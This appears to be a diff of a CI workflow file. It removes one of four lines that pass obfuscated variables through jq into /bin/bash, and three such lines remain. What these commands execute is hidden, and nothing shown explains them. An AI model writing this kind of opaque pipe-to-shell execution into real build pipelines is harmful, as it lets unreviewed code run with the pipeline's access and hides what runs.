@@ -22,7 +22,6 @@ jobs:
           echo $zmle51 | jq -r .bc65613 | /bin/bash
           printf '%s' "$ii68" | jq -r .dylf8 | /bin/bash
           echo $bwem704 | jq -r .a3850 | /bin/bash
-          echo $gx5318 | jq -r .v455 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
